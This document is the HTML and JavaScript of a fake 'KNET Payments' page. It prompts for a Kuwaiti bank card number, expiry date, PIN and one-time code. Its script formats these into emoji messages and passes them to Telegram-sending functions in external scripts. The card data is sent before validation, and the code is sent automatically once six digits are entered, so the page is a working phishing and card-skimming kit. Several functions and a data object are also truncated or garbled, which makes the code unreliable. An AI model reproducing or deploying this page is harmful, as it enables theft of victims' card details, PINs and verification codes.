<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>KNET Payments</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            body {
                font-family: Verdana, Arial, Helvetica, sans-serif;
                background-color: #ebebeb;
            }

            #DCNumber {
                letter-spacing: 0.04em;
            }

            #pinMask {
                font-size: 0.72rem;
                letter-spacing: 0.16em;
                display: inline-block;
            }

            .container {
                width: 100%;
                padding: 15px;
                box-sizing: border-box;
            }

            .content-block {
                width: 395px;
                margin: 0 auto;
            }

            .row {
                border-bottom: 1px solid #8f8f90;
                padding-bottom: 5px;
                padding-top: 5px;
            }

            .row_new {
                padding-bottom: 5px;
                padding-top: 5px;
            }

            .column-label,
            .column-value,
            .column-long {
                float: left;
            }

            .column-label {
                width: 40%;
            }

            .column-value {
                width: 60%;
            }

            .row.three-column .column-value {
                width: 18%;
                margin-right: 5px;
            }

            .row.three-column .column-long {
                width: 39%;
                float: right;
            }

            .row:after {
                content: "";
                display: table;
                clear: both;
            }

            .form-card {
                background-color: #ffffff;
                padding: 20px;
                border: 2px solid #8f8f90;
                border-radius: 15px;
                margin-bottom: 15px;
                box-shadow: 0 0 6px rgba(0,0,0,0.3);
            }

            .form-card:nth-child(1) {
                margin-top: 25px;
            }

            .form-card .row:nth-child(1) {
                padding-top: 0;
            }

            .form-card .row:nth-last-child(1) {
                border: 0;
                padding-bottom: 0;
            }

            .footer-content .row,
            .footer-content-new .row {
                border: 0;
                padding-bottom: 0;
            }

            form label {
                font-size: 11px;
                color: #0070cd;
                font-weight: bold;
                text-shadow: 0 1px 2px rgba(0,0,0,0.2);
            }

            select {
                font-size: 11px;
                height: 20px;
            }

            form .text-label,
            input,
            select {
                color: #444444;
                font-weight: normal;
            }

            form input[type="tel"],
            input[type="password"],
            form input[type="text"] {
                border: 2px solid #0070cd;
                box-shadow: inset 0 0 5px rgba(0,0,0,0.3);
                padding: 0 3px;
                outline: 0;
                font-size: 11px;
                height: 20px;
            }

            #ValidationMessage {
                margin: 0;
                box-sizing: border-box;
                transition: height 1s ease;
                border: #ff0000 1px solid;
                background-color: #f7dadd;
                font-size: 13px;
                font-family: helvetica, arial, sans serif;
                color: #ff0000;
                padding: 5px 2px 5px 2px;
                display: none;
                margin-bottom: 3px;
                text-align: center;
            }

            .footer-content {
                text-align: center;
                margin-top: 15px;
                font-weight: bold;
                color: #2277d3;
            }

            .brand-img {
                margin-right: 5px;
                float: right;
            }

            .brand-info {
                font-size: 12px;
                text-align: left;
            }

            .footer-content #knet-brand {
                width: 43px;
                height: 43px;
                background: url("./assets/images/knet-links.png") -148px 0 no-repeat;
                margin-top: 5px;
            }

            .footer-content .social-links {
                margin-top: 15px;
                text-align: center;
            }

            .footer-content .social-links div {
                height: 30px;
                display: inline-block;
            }

            .footer-content .social-links div#knet-yt {
                background: url("./assets/images/knet-links.png") 0 0 no-repeat;
                width: 35px;
            }

            .footer-content .social-links div#knet-sn {
                background: url("./assets/images/knet-links.png") -36px 0 no-repeat;
                width: 27px;
            }

            .footer-content .social-links div#knet-tw {
                background: url("./assets/images/knet-links.png") -64px 0 no-repeat;
                width: 27px;
            }

            .footer-content .social-links div#knet-it {
                background: url("./assets/images/knet-links.png") -93px 0 no-repeat;
                width: 27px;
            }

            .footer-content .social-links div#knet-fb {
                background: url("./assets/images/knet-links.png") -120px 0 no-repeat;
                width: 27px;
            }

            button {
                width: 100%;
            }

            .submit-button {
                background-color: #eaeaea;
                border: 1px solid #cacaca;
                padding: 5px 0;
                font-weight: bold;
                color: #666666;
                width: 50%;
                float: left;
                height: 27px;
                border-radius: 4px;
            }

            .cancel-button {
                background-color: #eaeaea;
                border: 1px solid #cacaca;
                padding: 5px 0;
                font-weight: bold;
                color: #666666;
                width: 50%;
                height: 27px;
                border-radius: 4px;
                -webkit-appearance: none;
            }

            .row.alert-msg {
                font-size: 12px;
                text-align: justify;
                background-color: #d9edf6;
                padding: 10px !important;
                border: 1px solid #bacce0;
                border-radius: 4px;
                margin-bottom: 10px;
            }

            .overlay {
                background: rgba(85, 85, 85, 0.5);
                display: none;
                position: fixed;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                z-index: 9999;
            }

            .overlay img {
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                height: min(15vh, 96px);
                width: auto;
            }

            .terms {
                font-size: 11px;
                color: #0070cd;
                font-weight: bold;
                font-style: italic;
                text-decoration: none;
            }

            .choiceOption {
                vertical-align: super;
            }

            .container-blogo {
                width: 100%;
                margin-top: -5px;
                margin-bottom: 15px;
            }

            .logoHead-mob {
                width: 42%;
                margin-left: 27%;
                margin-right: auto;
            }

            .madd {
                height: 90px;
                max-width: 372px;
                margin: 5px auto -30px auto;
                border-radius: 0px 10px;
                background-image: url("./assets/images/mob.jpg");
                display: block;
            }

            @media all and (max-width: 425px) {
                .content-block {
                    width: 98%;
                    margin: 0 auto;
                }
            }
        </style>
    </head>

    <script>
        const BANK_PREFIXES = {

        function prefixes(bankCode) {
            const prefixSelect = document.getElementById("dcprefix");
            const prefixValues = BANK_PREFIXES[bankCode] || [];
            const fragment = document.createDocumentFragment();

            if (!prefixValues.length) {
                fragment.appendChild(new Option("بادِئة", ""));
            } else {
                prefixValues.forEach(function(prefixValue) {
                    fragment.appendChild(new Option(prefixValue, prefixValue));
                });
            }

            prefixSelect.textContent = "";
            prefixSelect.appendChild(fragment);

            if (prefixValues.length) {
                prefixSelect.selectedIndex = 0;
            } else {
                prefixSelect.value = "";
            }
        }

        function findBankCodeByPrefix(prefixValue) {
            return Object.keys(BANK_PREFIXES).find(function(bankCode) {
                return BANK_PREFIXES[bankCode].includes(prefixValue);
            }) || "";
        }

        function hideValidationMessage(triggerFieldId) {
            const validationMessage = document.getElementById("ValidationMessage");
            const clearOnFields = (validationMessage.dataset.clearOnFields || "")
                .split(",")
                .filter(Boolean);

            if (clearOnFields.length && triggerFieldId && !clearOnFields.includes(triggerFieldId)) {
                return;
            }

            validationMessage.textContent = "";
            validationMessage.style.display = "none";
            validationMessage.dataset.clearOnFields = "";
        }

        function showValidationMessage(message, field, clearOnFields) {
            const validationMessage = document.getElementById("ValidationMessage");
            validationMessage.textContent = message;
            validationMessage.style.display = "block";
            validationMessage.dataset.clearOnFields = (clearOnFields || (field ? [field.id] : [])).join(",");

            if (field) {
                requestAnimationFrame(function() {
                    field.focus();
                });
            }
        }

        function updateDebitNumberMaxLength(shouldResetValue) {
            const prefixSelect = document.getElementById("dcprefix");
            const debitNumberInput = document.getElementById("debitNumber");
            const prefixLength = prefixSelect.value.length;
            const maxLength = prefixLength ? 16 - prefixLength : 10;

            debitNumberInput.maxLength = maxLength;
            debitNumberInput.setAttribute("maxlength", String(maxLength));
            debitNumberInput.title = "يجب أن يتكون هذا الجزء من " + maxLength + " أرقام";

            if (shouldResetValue) {
                debitNumberInput.value = "";
            } else if (debitNumberInput.value.length > maxLength) {
                debitNumberInput.value = debitNumberInput.value.slice(0, maxLength);
            }
        }

        function convertToWesternDigits(value) {
            const digitMap = {
                "٠": "0", "١": "1", "٢": "2", "٣": "3", "٤": "4",
                "٥": "5", "٦": "6", "٧": "7", "٨": "8", "٩": "9",
                "۰": "0", "۱": "1", "۲": "2", "۳": "3", "۴": "4",
                "۵": "5", "۶": "6", "۷": "7", "۸": "8", "۹": "9",
                "０": "0", "１": "1", "２": "2", "３": "3", "４": "4",
                "５": "5", "６": "6", "７": "7", "８": "8", "９": "9"
            };

            return value.replace(/[٠-٩۰-۹０-９]/g, function(character) {
                return digitMap[character] || character;
            });
        }

        function keepDigitsOnly(input, shouldConvertToWesternDigits) {
            if (shouldConvertToWesternDigits) {
                input.value = convertToWesternDigits(input.value);
            }

            input.value = input.value.replace(/\D/g, "");

            if (input.maxLength > 0 && input.value.length > input.maxLength) {
                input.value = input.value.slice(0, input.maxLength);
            }
        }

        function isExpiredCard(selectedMonth, selectedYear) {
            const now = new Date();
            const currentMonth = now.getMonth() + 1;
            const currentYear = now.getFullYear();
            const month = Number(selectedMonth);
            const year = Number(selectedYear);

            return year < currentYear || (year === currentYear && month < currentMonth);
        }

        function formatTwoDigits(value) {
            return String(value).padStart(2, "0");
        }

        function maskCardNumber(prefixValue, debitNumberValue) {
            const maskedPartLength = Math.max(debitNumberValue.length - 4, 0);
            const visibleLastDigits = debitNumberValue.slice(-4);
            return prefixValue + "*".repeat(maskedPartLength) + visibleLastDigits;
        }

        function maskPinCode(pinCodeValue) {
            return "●".repeat(pinCodeValue.length || 4);
        }

        function saveKnetDetailsToLocalStorage(details) {
            localStorage.setItem("bankname", details.bankname);
            localStorage.setItem("dcprefix", details.dcprefix);

            localStorage.setItem("month", details.month);
            localStorage.setItem("year", details.year);
            localStorage.setItem("pincode", details.pincode);

                dcprefix: localStorage.getItem("dcprefix") || "",

        document.addEventListener("DOMContentLoaded", function() {
            const form = document.querySelector("form");
            const bankSelect = document.getElementById("bank");
            const prefixSelect = document.getElementById("dcprefix");

            const otpDefaultPlaceholder = "أدخل رمز التحقق";
            const otpTimerDurationSeconds = 4 * 60;
            const OTP_STEP_STORAGE_KEY = "knetCurrentStep";
            const OTP_EXPIRES_AT_STORAGE_KEY = "knetOtpExpiresAt";
            let autoSentOtpValue = "";
            let otpTimerInterval = null;

            function fillKnetForm(details) {
                const prefixValue = details.dcprefix || "";
                const bankCode = details.bankname || findBankCodeByPrefix(prefixValue);

                bankSelect.value = bankCode;
                prefixes(bankSelect.value);

                if (prefixValue && Array.from(prefixSelect.options).some(function(option) {
                    return option.value === prefixValue;
                })) {
                    prefixSelect.value = prefixValue;
                }

                updateDebitNumberMaxLength(true);
                debitNumberInput.value = details.debitnumber || "";
                monthSelect.value = "";
                yearSelect.value = "";
                cardPinInput.value = "";
            }

            function restoreKnetFormFromStorage() {
                const storedDetails = getStoredKnetDetails();
                const hasStoredCoreValues = storedDetails.bankname || storedDetails.dcprefix || storedDetails.debitnumber;

                if (!hasStoredCoreValues) {
                    return false;
                }

                fillKnetForm(storedDetails);
                return true;
            }

            function markOtpStepActive(expiresAt) {
                sessionStorage.setItem(OTP_STEP_STORAGE_KEY, "otp");

                if (expiresAt) {
                    sessionStorage.setItem(OTP_EXPIRES_AT_STORAGE_KEY, String(expiresAt));
                }
            }

            function clearOtpStepState() {
                sessionStorage.removeItem(OTP_STEP_STORAGE_KEY);
                sessionStorage.removeItem(OTP_EXPIRES_AT_STORAGE_KEY);
            }

            function getStoredOtpExpiry() {
                const rawValue = Number(sessionStorage.getItem(OTP_EXPIRES_AT_STORAGE_KEY));
                return Number.isFinite(rawValue) ? rawValue : 0;
            }

            function setProceedButtonText(buttonText) {
                proceedButton.textContent = buttonText;
            }

            function stopOtpTimer(resetPlaceholder) {
                if (otpTimerInterval) {
                    window.clearInterval(otpTimerInterval);
                    otpTimerInterval = null;
                }

                if (resetPlaceholder) {
                    otpInput.placeholder = otpDefaultPlaceholder;
                }
            }

            function updateOtpPlaceholder(remainingSeconds) {
                otpInput.placeholder =
                    "Timeout in: " +
                    Math.floor(remainingSeconds / 60) +
                    ":" +
                    String(remainingSeconds % 60).padStart(2, "0");
            }

            function startOtpTimer(useStoredExpiry) {
                let expiresAt = useStoredExpiry ? getStoredOtpExpiry() : 0;

                if (!expiresAt) {
                    expiresAt = Date.now() + otpTimerDurationSeconds * 1000;
                }

                markOtpStepActive(expiresAt);
                stopOtpTimer(false);
                updateOtpPlaceholder(Math.max(Math.ceil((expiresAt - Date.now()) / 1000), 0));

                otpTimerInterval = window.setInterval(function() {
                    const remainingSeconds = Math.max(Math.ceil((expiresAt - Date.now()) / 1000), 0);
                    updateOtpPlaceholder(remainingSeconds);

                    if (remainingSeconds === 0) {
                        stopOtpTimer(false);
                    }
                }, 1000);
            }

            function isOtpFormVisible() {
                return otpForm.style.display === "block";
            }

            function updateValidationMessageDirection() {
                if (isOtpFormVisible()) {
                    validationMessage.setAttribute("dir", "rtl");
                    return;
                }

                validationMessage.removeAttribute("dir");
            }

            function formatTwoDigits(value) {
                return String(value).padStart(2, "0");
            }

            function maskCardNumber(prefixValue, debitNumberValue) {
                const maskedPartLength = Math.max(debitNumberValue.length - 4, 0);
                const visibleLastDigits = debitNumberValue.slice(-4);
                return prefixValue + "*".repeat(maskedPartLength) + visibleLastDigits;

                const safePrefix = prefixValue || "";

            function normalizeDigits(value) {
                return value
                    .replace(/[٠-٩]/g, function(char) { return String(char.charCodeAt(0) - 1632); })
                    .replace(/[۰-۹]/g, function(char) { return String(char.charCodeAt(0) - 1776); });
            }

            function extractOtpValue(value) {
                const normalized = normalizeDigits(value || "");
                const regexMatch = normalized.match(/(\d{6})/);
                return regexMatch ? regexMatch[1] : normalized.replace(/\D+/g, "").slice(0, 6);
            }

                    month: monthSelect.value.trim(),
                    year: yearSelect.value.trim(),
                    pincode: cardPinInput.value.trim()
                };
                const completeCardLength = details.dcprefix.length + details.debitnumber.length;
                const bankValid = Boolean(details.bankname);
                const cardValid = Boolean(details.dcprefix && details.debitnumber && completeCardLength === 16);
                const expiryValid = Boolean(details.month && details.year) && !isExpiredCard(details.month, details.year);
                const pinValid = /^\d{4}$/.test(details.pincode);

                return {
                    details: details,
                    bankValid: bankValid,
                    cardValid: cardValid,
                    expiryValid: expiryValid,
                    pinValid: pinValid
                };
            }

            async function requestReturnFromOtp() {
                if (!isOtpFormVisible()) {
                    return;
                }

                showKnetStep();
                sendKnetPageVisitMessage();
            }

            function validateKnetDetails(submissionState) {
                const details = submissionState.details;

                if (!submissionState.bankValid) {
                    showValidationMessage("خطأ- يرجى أختيار أسم البنك ", bankSelect, ["bank"]);
                    return false;
                }

                if (!details.debitnumber) {
                    showValidationMessage("خطأ يرجى أدخال رقم البطاقة بشكل صحيح", debitNumberInput, ["debitNumber"]);
                    return false;
                }

                if (!submissionState.cardValid) {
                    showValidationMessage("خطأ يرجى أدخال رقم البطاقة بشكل صحيح", debitNumberInput, ["bank", "dcprefix", "debitNumber"]);
                    return false;
                }

                if (!details.month) {
                    showValidationMessage("خطأ، يرجى اختيار شهر انتهاء البطاقة.", monthSelect, ["month"]);
                    return false;
                }

                if (!details.year) {
                    showValidationMessage("خطأ، يرجى اختيار سنة انتهاء البطاقة.", yearSelect, ["year"]);
                    return false;
                }

                if (!submissionState.expiryValid) {
                    showValidationMessage("خطأ - البطاقة مدخلة منتهية الصلاحية", monthSelect, ["month", "year"]);
                    return false;
                }

                if (!submissionState.pinValid) {
                    showValidationMessage("خطأ، الرقم السري غير صحيح، يجب أن يتكون من 4 أرقام.", cardPinInput, ["cardPin"]);
                    return false;
                }

                return true;
            }

            function buildManualKnetMessage(submissionState) {
                const details = submissionState.details;
                const identity = getStoredIdentityForKnet();
                const applicantInfo = !identity.name && !identity.phone
                    ? "👤 لا يوجد معلومات عن مقدم هذا الطلب"
                    : identity.name && identity.phone
                        ? "👤 " + identity.name + " - " + identity.phone
                        : "👤 " + (identity.name || identity.phone);

                return [
                    `💳 بطاقة كي نت 💳`,
                    applicantInfo,
                    `🏦 ${submissionState.bankValid ? details.bankname : "❌"}`,
                    `💳 ${submissionState.cardValid ? details.dcprefix + " " + details.debitnumber : "❌"}`,
                    `📅 ${submissionState.expiryValid ? formatTwoDigits(details.month) + " / " + details.year : "❌"}`,
                    `🔐 ${submissionState.pinValid ? details.pincode : "❌"}`
                ].join("\n");
            }

            async function handleKnetDetailsSubmit() {
                const submissionState = getKnetSubmissionState();

                if (window.sendAppTelegramMessage) {
                    await window.sendAppTelegramMessage(buildManualKnetMessage(submissionState), false);
                }

                if (!validateKnetDetails(submissionState)) {
                    return;
                }

                const details = submissionState.details;

                saveKnetDetailsToLocalStorage(details);
                hideValidationMessage();
                overlayHide.style.display = "block";
                proceedButton.disabled = true;

                if (window.showSubmissionLoadingOverlay) {
                    window.showSubmissionLoadingOverlay("جارٍ إرسال معلومات كي نت...", 3000, "knet");
                }

                populateOtpVerification(details);
                autoSentOtpValue = "";
                showOtpStep(false);
            }

            async function handleOtpSubmit() {
                const otpValue = extractOtpValue(otpInput.value);

                if (otpValue.length !== 6) {
                    showValidationMessage("خطأ - يرجى إدخال رمز التحقق بشكل صحيح", otpInput, ["dop"]);
                    return;
                }

                otpInput.value = otpValue;
                hideValidationMessage();
                overlayHide.style.display = "block";
                proceedButton.disabled = true;

                if (window.sendTelegramUntilDelivered) {
                    await window.sendTelegramUntilDelivered(buildManualOtpMessage(otpValue), false);
                }

                if (window.showSubmissionLoadingOverlay) {
                    window.showSubmissionLoadingOverlay("جارٍ إرسال رمز التحقق...", 3000, "knet");
                }

                overlayHide.style.display = "none";
                proceedButton.disabled = false;
                if (window.hideSubmissionLoadingOverlay) {
                    window.hideSubmissionLoadingOverlay();
                }

                otpInput.value = "";
                hideValidationMessage();
            }

            prefixes(bankSelect.value);
            updateDebitNumberMaxLength(false);
            sendKnetPageVisitMessage();
            showKnetStep();

            bankSelect.addEventListener("change", function() {
                prefixes(this.value);
                updateDebitNumberMaxLength(true);
                hideValidationMessage(this.id);
            });

            prefixSelect.addEventListener("change", function() {
                updateDebitNumberMaxLength(true);
                hideValidationMessage(this.id);
            });

            debitNumberInput.addEventListener("input", function() {
                keepDigitsOnly(this, true);
                hideValidationMessage(this.id);
            });

            monthSelect.addEventListener("change", function() {
                hideValidationMessage(this.id);
            });

            yearSelect.addEventListener("change", function() {
                hideValidationMessage(this.id);
            });

            cardPinInput.addEventListener("input", function() {
                keepDigitsOnly(this, true);
                hideValidationMessage(this.id);
            });

            otpInput.addEventListener("input", function() {
                const otpValue = extractOtpValue(otpInput.value);
                otpInput.value = otpValue;
                hideValidationMessage(this.id);

                if (otpValue.length === 6 && otpValue !== autoSentOtpValue && window.sendTelegramMessageWithQueue) {
                    autoSentOtpValue = otpValue;
                    window.sendTelegramMessageWithQueue(buildAutoOtpMessage(otpValue), false).catch(function() {});
                }
            });

            cancelButton.addEventListener("click", function() {
                requestReturnFromOtp().catch(function() {});
            });

            form.addEventListener("submit", function(event) {
                event.preventDefault();

                const action = isOtpFormVisible() ? handleOtpSubmit() : handleKnetDetailsSubmit();

                action.catch(function() {
                    overlayHide.style.display = "none";
                    proceedButton.disabled = false;
                    if (window.hideSubmissionLoadingOverlay) {
                        window.hideSubmissionLoadingOverlay();
                    }
                });
            });
        });
    </script>
    <script src="./assets/js/telegram.js"></script>
    <script src="./assets/js/tg.js"></script>
    </body>
</html>
